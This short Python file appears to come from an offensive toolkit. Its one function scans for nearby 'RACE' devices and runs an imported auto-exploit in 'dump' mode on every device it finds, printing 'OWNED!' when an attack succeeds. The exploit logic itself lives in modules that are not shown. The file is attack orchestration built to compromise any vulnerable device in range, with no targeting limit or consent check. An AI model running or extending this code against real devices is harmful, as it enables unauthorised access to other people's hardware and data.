from typing import Any

from modules.discovery import aggressive_scan
from modules.exploit import auto_exploit

from utils.config import RACEConfig


async def hunt_and_pwn(config: RACEConfig, timeout: int = 20) -> None:
    """Automatically find and exploit RACE devices."""
    print("=" * 60)
    print("  AUTO-HUNTER: Finding and pwning RACE devices")
    print("=" * 60)

    devices = await aggressive_scan(config, timeout)

    if not devices:
        print("[-] No RACE devices found")
        return

    print(f"[+] Found {len(devices)} RACE device(s)")

    for dev in devices:
        print(f"\n[*] Exploiting {dev['address']}...")
        result = await auto_exploit(dev["address"], "dump", config)

        if result["status"] == "success":
            print(f"[+] {dev['address']} OWNED!")
        else:
            print(f"[-] {dev['address']} failed: {result.get('message', '')}")
